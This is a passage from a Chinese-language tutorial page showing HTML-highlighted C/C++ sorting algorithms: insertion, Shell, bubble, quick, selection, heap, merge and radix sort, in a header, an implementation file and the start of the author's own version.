class="params">(RecType R[],<span class="type">int</span> n)</span></span>;  <span class="comment">//希尔排序算法</span></span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">BubbleSort</span><span class="params">(RecType R[],<span class="type">int</span> n)</span></span>; <span class="comment">//冒泡排序</span></span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">QuickSort</span><span class="params">(RecType R[],<span class="type">int</span> n)</span></span>;  <span class="comment">//快速排序</span></span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">SelectSort</span><span class="params">(RecType R[],<span class="type">int</span> n)</span></span>;  <span class="comment">//直接选择排序</span></span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">HeapSort</span><span class="params">(RecType R[],<span class="type">int</span> n)</span></span>;  <span class="comment">//堆排序</span></span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">MergeSort</span><span class="params">(RecType R[],<span class="type">int</span> n)</span></span>; <span class="comment">//归并排序</span></span><br><span class="line"></span><br><span class="line"><span class="comment">//下面函数支持基数排序</span></span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">CreateLink</span><span class="params">(RadixRecType *&amp;p,RecType R[],<span class="type">int</span> n)</span></span>;   <span class="comment">//创建基数排序用的链表</span></span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">DestoryLink</span><span class="params">(RadixRecType *&amp;p)</span></span>; <span class="comment">//释放基数排序用的链表</span></span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">RadixSort</span><span class="params">(RadixRecType *&amp;p)</span></span>; <span class="comment">//基数排序</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">endif</span> <span class="comment">// SORT_H_INCLUDED</span></span></span><br></pre></td></tr></table></figure>

<h3 id="3-算法的实现——-sort-cpp"><a href="#3-算法的实现——-sort-cpp" class="headerlink" title="3.算法的实现—— sort.cpp"></a>3.算法的实现—— sort.cpp</h3><figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&quot;sort.h&quot;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;malloc.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="comment">//1. 对R[0..n-1]按递增有序进行直接插入排序</span></span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">InsertSort</span><span class="params">(RecType R[],<span class="type">int</span> n)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="type">int</span> i,j;</span><br><span class="line">    RecType tmp;</span><br><span class="line">    <span class="keyword">for</span> (i=<span class="number">1</span>; i&lt;n; i++)</span><br><span class="line">    &#123;</span><br><span class="line">        tmp=R[i];</span><br><span class="line">        j=i<span class="number">-1</span>;            <span class="comment">//从右向左在有序区R[0..i-1]中找R[i]的插入位置</span></span><br><span class="line">        <span class="keyword">while</span> (j&gt;=<span class="number">0</span> &amp;&amp; tmp.key&lt;R[j].key)</span><br><span class="line">        &#123;</span><br><span class="line">            R[j+<span class="number">1</span>]=R[j]; <span class="comment">//将关键字大于R[i].key的记录后移</span></span><br><span class="line">            j--;</span><br><span class="line">        &#125;</span><br><span class="line">        R[j+<span class="number">1</span>]=tmp;      <span class="comment">//在j+1处插入R[i]</span></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">//2. 希尔排序算法</span></span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">ShellSort</span><span class="params">(RecType R[],<span class="type">int</span> n)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="type">int</span> i,j,gap;</span><br><span class="line">    RecType tmp;</span><br><span class="line">    gap=n/<span class="number">2</span>;                <span class="comment">//增量置初值</span></span><br><span class="line">    <span class="keyword">while</span> (gap&gt;<span class="number">0</span>)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">for</span> (i=gap; i&lt;n; i++) <span class="comment">//对所有相隔gap位置的所有元素组进行排序</span></span><br><span class="line">        &#123;</span><br><span class="line">            tmp=R[i];</span><br><span class="line">            j=i-gap;</span><br><span class="line">            <span class="keyword">while</span> (j&gt;=<span class="number">0</span> &amp;&amp; tmp.key&lt;R[j].key)<span class="comment">//对相隔gap位置的元素组进行排序</span></span><br><span class="line">            &#123;</span><br><span class="line">                R[j+gap]=R[j];</span><br><span class="line">                j=j-gap;</span><br><span class="line">            &#125;</span><br><span class="line">            R[j+gap]=tmp;</span><br><span class="line">            j=j-gap;</span><br><span class="line">        &#125;</span><br><span class="line">        gap=gap/<span class="number">2</span>;  <span class="comment">//减小增量</span></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">//3. 冒泡排序</span></span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">BubbleSort</span><span class="params">(RecType R[],<span class="type">int</span> n)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="type">int</span> i,j,exchange;</span><br><span class="line">    RecType tmp;</span><br><span class="line">    <span class="keyword">for</span> (i=<span class="number">0</span>; i&lt;n<span class="number">-1</span>; i++)</span><br><span class="line">    &#123;</span><br><span class="line">        exchange=<span class="number">0</span>;</span><br><span class="line">        <span class="keyword">for</span> (j=n<span class="number">-1</span>; j&gt;i; j--)   <span class="comment">//比较,找出最小关键字的记录</span></span><br><span class="line">            <span class="keyword">if</span> (R[j].key&lt;R[j<span class="number">-1</span>].key)</span><br><span class="line">            &#123;</span><br><span class="line">                tmp=R[j];  <span class="comment">//R[j]与R[j-1]进行交换,将最小关键字记录前移</span></span><br><span class="line">                R[j]=R[j<span class="number">-1</span>];</span><br><span class="line">                R[j<span class="number">-1</span>]=tmp;</span><br><span class="line">                exchange=<span class="number">1</span>;</span><br><span class="line">            &#125;</span><br><span class="line">        <span class="keyword">if</span> (exchange==<span class="number">0</span>)    <span class="comment">//没有交换，即结束算法</span></span><br><span class="line">            <span class="keyword">return</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">//4. 对R[s]至R[t]的元素进行快速排序</span></span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">QuickSortR</span><span class="params">(RecType R[],<span class="type">int</span> s,<span class="type">int</span> t)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="type">int</span> i=s,j=t;</span><br><span class="line">    RecType tmp;</span><br><span class="line">    <span class="keyword">if</span> (s&lt;t)                <span class="comment">//区间内至少存在两个元素的情况</span></span><br><span class="line">    &#123;</span><br><span class="line">        tmp=R[s];           <span class="comment">//用区间的第1个记录作为基准</span></span><br><span class="line">        <span class="keyword">while</span> (i!=j)        <span class="comment">//从区间两端交替向中间扫描,直至i=j为止</span></span><br><span class="line">        &#123;</span><br><span class="line">            <span class="keyword">while</span> (j&gt;i &amp;&amp; R[j].key&gt;=tmp.key)</span><br><span class="line">                j--;        <span class="comment">//从右向左扫描,找第1个小于tmp.key的R[j]</span></span><br><span class="line">            R[i]=R[j];      <span class="comment">//找到这样的R[j],R[i]&quot;R[j]交换</span></span><br><span class="line">            <span class="keyword">while</span> (i&lt;j &amp;&amp; R[i].key&lt;=tmp.key)</span><br><span class="line">                i++;        <span class="comment">//从左向右扫描,找第1个大于tmp.key的记录R[i]</span></span><br><span class="line">            R[j]=R[i];      <span class="comment">//找到这样的R[i],R[i]&quot;R[j]交换</span></span><br><span class="line">        &#125;</span><br><span class="line">        R[i]=tmp;</span><br><span class="line">        <span class="built_in">QuickSortR</span>(R,s,i<span class="number">-1</span>);     <span class="comment">//对左区间递归排序</span></span><br><span class="line">        <span class="built_in">QuickSortR</span>(R,i+<span class="number">1</span>,t);     <span class="comment">//对右区间递归排序</span></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">//4. 快速排序辅助函数，对外同其他算法统一接口，内部调用递归的快速排序</span></span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">QuickSort</span><span class="params">(RecType R[],<span class="type">int</span> n)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="built_in">QuickSortR</span>(R, <span class="number">0</span>, n<span class="number">-1</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">//5. 直接选择排序</span></span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">SelectSort</span><span class="params">(RecType R[],<span class="type">int</span> n)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="type">int</span> i,j,k;</span><br><span class="line">    RecType temp;</span><br><span class="line">    <span class="keyword">for</span> (i=<span class="number">0</span>; i&lt;n<span class="number">-1</span>; i++)           <span class="comment">//做第i趟排序</span></span><br><span class="line">    &#123;</span><br><span class="line">        k=i;</span><br><span class="line">        <span class="keyword">for</span> (j=i+<span class="number">1</span>; j&lt;n; j++)   <span class="comment">//在当前无序区R[i..n-1]中选key最小的R[k]</span></span><br><span class="line">            <span class="keyword">if</span> (R[j].key&lt;R[k].key)</span><br><span class="line">                k=j;            <span class="comment">//k记下目前找到的最小关键字所在的位置</span></span><br><span class="line">        <span class="keyword">if</span> (k!=i)               <span class="comment">//交换R[i]和R[k]</span></span><br><span class="line">        &#123;</span><br><span class="line">            temp=R[i];</span><br><span class="line">            R[i]=R[k];</span><br><span class="line">            R[k]=temp;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">//6. 堆排序辅助之——调整堆</span></span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">sift</span><span class="params">(RecType R[],<span class="type">int</span> low,<span class="type">int</span> high)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="type">int</span> i=low,j=<span class="number">2</span>*i;                        <span class="comment">//R[j]是R[i]的左孩子</span></span><br><span class="line">    RecType temp=R[i];</span><br><span class="line">    <span class="keyword">while</span> (j&lt;=high)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">if</span> (j&lt;high &amp;&amp; R[j].key&lt;R[j+<span class="number">1</span>].key)  <span class="comment">//若右孩子较大,把j指向右孩子</span></span><br><span class="line">            j++;                                <span class="comment">//变为2i+1</span></span><br><span class="line">        <span class="keyword">if</span> (temp.key&lt;R[j].key)</span><br><span class="line">        &#123;</span><br><span class="line">            R[i]=R[j];                          <span class="comment">//将R[j]调整到双亲结点位置上</span></span><br><span class="line">            i=j;                                <span class="comment">//修改i和j值,以便继续向下筛选</span></span><br><span class="line">            j=<span class="number">2</span>*i;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">else</span> <span class="keyword">break</span>;                             <span class="comment">//筛选结束</span></span><br><span class="line">    &#125;</span><br><span class="line">    R[i]=temp;                                  <span class="comment">//被筛选结点的值放入最终位置</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">//6. 堆排序</span></span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">HeapSort</span><span class="params">(RecType R[],<span class="type">int</span> n)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="type">int</span> i;</span><br><span class="line">    RecType temp;</span><br><span class="line">    <span class="keyword">for</span> (i=n/<span class="number">2</span>; i&gt;=<span class="number">1</span>; i--) <span class="comment">//循环建立初始堆</span></span><br><span class="line">        <span class="built_in">sift</span>(R,i,n);</span><br><span class="line">    <span class="keyword">for</span> (i=n; i&gt;=<span class="number">2</span>; i--) <span class="comment">//进行n-1次循环,完成推排序</span></span><br><span class="line">    &#123;</span><br><span class="line">        temp=R[<span class="number">1</span>];       <span class="comment">//将第一个元素同当前区间内R[1]对换</span></span><br><span class="line">        R[<span class="number">1</span>]=R[i];</span><br><span class="line">        R[i]=temp;</span><br><span class="line">        <span class="built_in">sift</span>(R,<span class="number">1</span>,i<span class="number">-1</span>);   <span class="comment">//筛选R[1]结点,得到i-1个结点的堆</span></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">//7.归并排序辅助1——合并有序表</span></span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">Merge</span><span class="params">(RecType R[],<span class="type">int</span> low,<span class="type">int</span> mid,<span class="type">int</span> high)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    RecType *R1;</span><br><span class="line">    <span class="type">int</span> i=low,j=mid+<span class="number">1</span>,k=<span class="number">0</span>; <span class="comment">//k是R1的下标,i、j分别为第1、2段的下标</span></span><br><span class="line">    R1=(RecType *)<span class="built_in">malloc</span>((high-low+<span class="number">1</span>)*<span class="built_in">sizeof</span>(RecType));  <span class="comment">//动态分配空间</span></span><br><span class="line">    <span class="keyword">while</span> (i&lt;=mid &amp;&amp; j&lt;=high)       <span class="comment">//在第1段和第2段均未扫描完时循环</span></span><br><span class="line">        <span class="keyword">if</span> (R[i].key&lt;=R[j].key)     <span class="comment">//将第1段中的记录放入R1中</span></span><br><span class="line">        &#123;</span><br><span class="line">            R1[k]=R[i];</span><br><span class="line">            i++;</span><br><span class="line">            k++;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">else</span>                            <span class="comment">//将第2段中的记录放入R1中</span></span><br><span class="line">        &#123;</span><br><span class="line">            R1[k]=R[j];</span><br><span class="line">            j++;</span><br><span class="line">            k++;</span><br><span class="line">        &#125;</span><br><span class="line">    <span class="keyword">while</span> (i&lt;=mid)                      <span class="comment">//将第1段余下部分复制到R1</span></span><br><span class="line">    &#123;</span><br><span class="line">        R1[k]=R[i];</span><br><span class="line">        i++;</span><br><span class="line">        k++;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">while</span> (j&lt;=high)                 <span class="comment">//将第2段余下部分复制到R1</span></span><br><span class="line">    &#123;</span><br><span class="line">        R1[k]=R[j];</span><br><span class="line">        j++;</span><br><span class="line">        k++;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">for</span> (k=<span class="number">0</span>,i=low; i&lt;=high; k++,i++) <span class="comment">//将R1复制回R中</span></span><br><span class="line">        R[i]=R1[k];</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">//7. 归并排序辅助2——一趟归并</span></span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">MergePass</span><span class="params">(RecType R[],<span class="type">int</span> length,<span class="type">int</span> n)</span>    <span class="comment">//对整个数序进行一趟归并</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="type">int</span> i;</span><br><span class="line">    <span class="keyword">for</span> (i=<span class="number">0</span>; i+<span class="number">2</span>*length<span class="number">-1</span>&lt;n; i=i+<span class="number">2</span>*length)     <span class="comment">//归并length长的两相邻子表</span></span><br><span class="line">        <span class="built_in">Merge</span>(R,i,i+length<span class="number">-1</span>,i+<span class="number">2</span>*length<span class="number">-1</span>);</span><br><span class="line">    <span class="keyword">if</span> (i+length<span class="number">-1</span>&lt;n)                       <span class="comment">//余下两个子表,后者长度小于length</span></span><br><span class="line">        <span class="built_in">Merge</span>(R,i,i+length<span class="number">-1</span>,n<span class="number">-1</span>);          <span class="comment">//归并这两个子表</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">//7. 归并排序</span></span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">MergeSort</span><span class="params">(RecType R[],<span class="type">int</span> n)</span>           <span class="comment">//自底向上的二路归并算法</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="type">int</span> length;</span><br><span class="line">    <span class="keyword">for</span> (length=<span class="number">1</span>; length&lt;n; length=<span class="number">2</span>*length) <span class="comment">//进行log2n趟归并</span></span><br><span class="line">        <span class="built_in">MergePass</span>(R,length,n);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">//以下基数排序，为了统一测试有改造</span></span><br><span class="line"><span class="comment">//8. 基数排序的辅助函数，创建基数排序用的链表</span></span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">CreateLink</span><span class="params">(RadixRecType *&amp;p,RecType R[],<span class="type">int</span> n)</span>   <span class="comment">//采用后插法产生链表</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="type">int</span> i;</span><br><span class="line">    RadixRecType *s,*t;</span><br><span class="line">    <span class="keyword">for</span> (i=<span class="number">0</span>; i&lt;n; i++)</span><br><span class="line">    &#123;</span><br><span class="line">        s=(RadixRecType *)<span class="built_in">malloc</span>(<span class="built_in">sizeof</span>(RadixRecType));</span><br><span class="line">        s-&gt;data = R[i].key;</span><br><span class="line">        <span class="keyword">if</span> (i==<span class="number">0</span>)</span><br><span class="line">        &#123;</span><br><span class="line">            p=s;</span><br><span class="line">            t=s;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">else</span></span><br><span class="line">        &#123;</span><br><span class="line">            t-&gt;next=s;</span><br><span class="line">            t=s;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    t-&gt;next=<span class="literal">NULL</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">//8. 基数排序的辅助函数，释放基数排序用的链表</span></span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">DestoryLink</span><span class="params">(RadixRecType *&amp;p)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    RadixRecType *q;</span><br><span class="line">    <span class="keyword">while</span>(p!=<span class="literal">NULL</span>)</span><br><span class="line">    &#123;</span><br><span class="line">        q=p-&gt;next;</span><br><span class="line">        <span class="built_in">free</span>(p);</span><br><span class="line">        p=q;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">//8. 实现基数排序:*p为待排序序列链表指针,基数R和关键字位数D已经作为符号常量定义好</span></span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">RadixSort</span><span class="params">(RadixRecType *&amp;p)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    RadixRecType *head[Radix],*tail[Radix],*t; <span class="comment">//定义各链队的首尾指针</span></span><br><span class="line">    <span class="type">int</span> i,j,k;</span><br><span class="line">    <span class="type">unsigned</span> <span class="type">int</span> d1, d2=<span class="number">1</span>;   <span class="comment">//用于分离出第i位数字，见下面的注释</span></span><br><span class="line">    <span class="keyword">for</span> (i=<span class="number">1</span>; i&lt;=Digits; i++)                  <span class="comment">//从低位到高位循环</span></span><br><span class="line">    &#123;</span><br><span class="line">        <span class="comment">//分离出倒数第i位数字，先通过对d1=10^i取余，得到其后i位，再通过整除d2=10^(i-1)得到第i位</span></span><br><span class="line">        <span class="comment">//例如，分离出倒数第1位，即个位数，先对d1=10取余，再整除d2=1</span></span><br><span class="line">        <span class="comment">//再例如，分离出倒数第2位，即十位数，先对d1=100取余，再整除d2=10</span></span><br><span class="line">        <span class="comment">//循环之前，d2已经初始化为1，在这一层循环末增加10倍</span></span><br><span class="line">        <span class="comment">//下面根据d2，得到d1的值</span></span><br><span class="line">        d1=d2*<span class="number">10</span>;</span><br><span class="line">        <span class="keyword">for</span> (j=<span class="number">0</span>; j&lt;Radix; j++)                 <span class="comment">//初始化各链队首、尾指针</span></span><br><span class="line">            head[j]=tail[j]=<span class="literal">NULL</span>;</span><br><span class="line">        <span class="keyword">while</span> (p!=<span class="literal">NULL</span>)                 <span class="comment">//对于原链表中每个结点循环</span></span><br><span class="line">        &#123;</span><br><span class="line">            k=(p-&gt;data%d1)/d2;           <span class="comment">//分离出第i位数字k</span></span><br><span class="line">            <span class="keyword">if</span> (head[k]==<span class="literal">NULL</span>)          <span class="comment">//进行分配</span></span><br><span class="line">            &#123;</span><br><span class="line">                head[k]=p;</span><br><span class="line">                tail[k]=p;</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">else</span></span><br><span class="line">            &#123;</span><br><span class="line">                tail[k]-&gt;next=p;</span><br><span class="line">                tail[k]=p;</span><br><span class="line">            &#125;</span><br><span class="line">            p=p-&gt;next;                  <span class="comment">//取下一个待排序的元素</span></span><br><span class="line">        &#125;</span><br><span class="line">        p=<span class="literal">NULL</span>;                         <span class="comment">//重新用p来收集所有结点</span></span><br><span class="line">        <span class="keyword">for</span> (j=<span class="number">0</span>; j&lt;Radix; j++)             <span class="comment">//对于每一个链队循环</span></span><br><span class="line">            <span class="keyword">if</span> (head[j]!=<span class="literal">NULL</span>)          <span class="comment">//进行收集</span></span><br><span class="line">            &#123;</span><br><span class="line">                <span class="keyword">if</span> (p==<span class="literal">NULL</span>)</span><br><span class="line">                &#123;</span><br><span class="line">                    p=head[j];</span><br><span class="line">                    t=tail[j];</span><br><span class="line">                &#125;</span><br><span class="line">                <span class="keyword">else</span></span><br><span class="line">                &#123;</span><br><span class="line">                    t-&gt;next=head[j];</span><br><span class="line">                    t=tail[j];</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        t-&gt;next=<span class="literal">NULL</span>;                   <span class="comment">//最后一个结点的next域置NULL</span></span><br><span class="line">        <span class="comment">//下面更新用于分离出第i位数字的d2</span></span><br><span class="line">        d2*=<span class="number">10</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h3 id="4-我的算法"><a href="#4-我的算法" class="headerlink" title="4.我的算法"></a>4.我的算法</h3><figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;time.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;malloc.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> MaxSize 100005</span></span><br><span class="line"><span class="keyword">typedef</span> <span class="type">int</span> KeyType;    <span class="comment">//定义关键字类型</span></span><br><span class="line"><span class="keyword">typedef</span> <span class="type">char</span> InfoType[<span class="number">10</span>];</span><br><span class="line"></span><br><span class="line"><span class="comment">//下面的符号常量和结构体针对基数排序</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> Radix 10           <span class="comment">//基数的取值</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> Digits 10          <span class="comment">//关键字位数</span></span></span><br><span class="line"></span><br><span class="line"><span class="keyword">typedef</span> <span class="keyword">struct</span>          <span class="comment">//记录类型</span></span><br><span class="line">&#123;</span><br><span class="line">    KeyType key;        <span class="comment">//关键字项</span></span><br><span class="line">    InfoType data;      <span class="comment">//其他数据项,类型为InfoType</span></span><br><span class="line">&#125; RecType;              <span class="comment">//排序的记录类型定义</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">typedef</span> <span class="keyword">struct</span> <span class="title class_">node</span></span><br><span class="line">&#123;</span><br><span class="line">    KeyType data;      <span class="comment">//记录的关键字，同算法讲解中有差别</span></span><br><span class="line">    <span class="keyword">struct</span> <span class="title class_">node</span> *next;</span><br><span class="line">&#125; RadixRecType;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">CreaLink</span><span class="params">(RecType *&amp;p,<span class="type">char</span> *a[],<span class="type">int</span> n)</span></span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">/*1、插入排序*/</span></span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">InsertSort</span><span class="params">(RecType R[],<span class="type">int</span> n)</span> <span class="comment">//对R[0..n-1]按递增有序进行直接插入排序</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="type">int</span> i,j;</span><br><span class="line">    RecType tmp;</span><br><span class="line">    <span class="keyword">for</span> (i=<span class="number">1</span>; i&lt;n; i++)</span><br><span class="line">    &#123;</span><br><span class="line">        tmp=R[i];</span><br><span class="line">        j=i<span class="number">-1</span>;            <span class="comment">//从右向左在有序区R[0..i-1]中找R[i]的插入位置</span></span><br><span class="line">        <span class="keyword">while</span> (j&gt;=<span class="number">0</span> &amp;&amp; tmp.key&lt;R[j].key)</span><br><span class="line">        &#123;</span><br><span class="line">            R[j+<span class="number">1</span>]=R[j]; <span class="comment">//将关键字大于R[i].key的记录后移</span></span><br><span class="line">            j--;</span><br><span class="line">        &#125;</span><br><span class="line">        R[j+<span class="number">1</span>]=tmp;      <span class="comment">//在j+1处插入R[i]</span></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">/*2、希尔排序*/</span></span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">ShellSort</span><span class="params">(RecType R[],<span class="type">int</span> n)</span>   <span class="comment">//希尔排序算法</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="type">int</span> i,j,gap;</span><br><span class="line">    RecType tmp;</span><br><span class="line">    gap=n/<span class="number">2</span>;                <span class="comment">//增量置初值</span></span><br><span class="line">    <span class="keyword">while</span> (gap&gt;<span class="number">0</span>)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">for</span> (i=gap; i&lt;n; i++) <span class="comment">//对所有相隔gap位置的所有元素组进行排序</span></span><br><span class="line">        &#123;</span><br><span class="line">            tmp=R[i];</span><br><span class="line">            j=i-gap;</span><br><span class="line">            <span class="keyword">while</span> (j&gt;=<span class="number">0</span> &amp;&amp; tmp.key&lt;R[j].key)<span class="comment">//对相隔gap位置的元素组进行排序</span></span><br><span class="line">            &#123;</span><br><span class="line">                R[j+gap]=R[j];</span><br><span class="line">                j=j-gap;</span><br><span class="line">            &#125;</span><br><span class="line">            R[j+gap]=tmp;</span><br><span class="line">            j=j-gap;</span><br><span class="line">        &#125;</span><br><span class="line">        gap=gap/<span class="number">2</span>;  <span class="comment">//减小增量</span></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">/*3、冒泡排序*/</span></span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">BubbleSort1</span><span class="params">(RecType R[],<span class="type">int</span> n)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="type">int</span> i,j,k,exchange;</span><br><span class="line">    RecType tmp;</span><br><span class="line">    <span class="keyword">for</span> (i=<span class="number">0</span>; i&lt;n<span class="number">-1</span>; i++)</span><br><span class="line">    &#123;</span><br><span class="line">        exchange=<span class="number">0</span>;</span><br><span class="line">        <span class="keyword">for</span> (j=n<span class="number">-1</span>; j&gt;i; j--)   <span class="comment">//比较,找出最小关键字的记录</span></span><br><span class="line">            <span class="keyword">if</span> (R[j].key&lt;R[j<span class="number">-1</span>].key)</span><br><span class="line">            &#123;</span><br><span class="line">                tmp=R[j];  <span class="comment">//R[j]与R[j-1]进行交换,将最小关键字记录前移</span></span><br><span class="line">                R[j]=R[j<span class="number">-1</span>];</span><br><span class="line">                R[j<span class="number">-1</span>]=tmp;</span><br><span class="line">                exchange=<span class="number">1</span>;</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">        <span class="comment">// printf(&quot;i=%d: &quot;,i);</span></span><br><span class="line">        <span class="comment">// for (k=0; k&lt;n; k++)</span></span><br><span class="line">        <span class="comment">//     printf(&quot;%d &quot;,R[k].key);</span></span><br><span class="line">        <span class="comment">// printf(&quot;\n&quot;);</span></span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> (exchange==<span class="number">0</span>)    <span class="comment">//中途结束算法</span></span><br><span class="line">            <span class="keyword">return</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">/*4、快速排序*/</span></span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">QuickSortR</span><span class="params">(RecType R[],<span class="type">int</span> s,<span class="type">int</span> t)</span> <span class="comment">//对R[s]至R[t]的元素进行快速排序</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="type">int</span> i=s,j=t;</span><br><span class="line">    RecType tmp;</span><br><span class="line">    <span class="keyword">if</span> (s&lt;t)                <span class="comment">//区间内至少存在两个元素的情况</span></span><br><span class="line">    &#123;</span><br><span class="line">        tmp=R[s];           <span class="comment">//用区间的第1个记录作为基准</span></span><br><span class="line">        <span class="keyword">while</span> (i!=j)        <span class="comment">//从区间两端交替向中间扫描,直至i=j为止</span></span><br><span class="line">        &#123;</span><br><span class="line">            <span class="keyword">while</span> (j&gt;i &amp;&amp; R[j].key&gt;=tmp.key)</span><br><span class="line">                j--;        <span class="comment">//从右向左扫描,找第1个小于tmp.key的R[j]</span></span><br><span class="line">            R[i]=R[j];      <span class="comment">//找到这样的R[j],R[i]&quot;R[j]交换</span></span><br><span class="line">            <span class="keyword">while</span> (i&lt;j &amp;&amp; R[i].key&lt;=tmp.key)</span><br><span class="line">                i++;        <span class="comment">//从左向右扫描,找第1个大于tmp.key的记录R[i]</span></span><br><span class="line">            R[j]=R[i];      <span class="comment">//找到这样的R[i],R[i]&quot;R[j]交换</span></span><br><span class="line">        &#125;</span><br><span class="line">        R[i]=tmp;</span><br><span class="line">        <span class="built_in">QuickSortR</span>(R,s,i<span class="number">-1</span>);     <span class="comment">//对左区间递归排序</span></span><br><span class="line">        <span class="built_in">QuickSortR</span>(R,i+<span class="number">1</span>,t);     <span class="comment">//对右区间递归排序</span></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">/*快速排序辅助函数，用于标准化*/</span></span><br><span class="line"><span class="function"><span 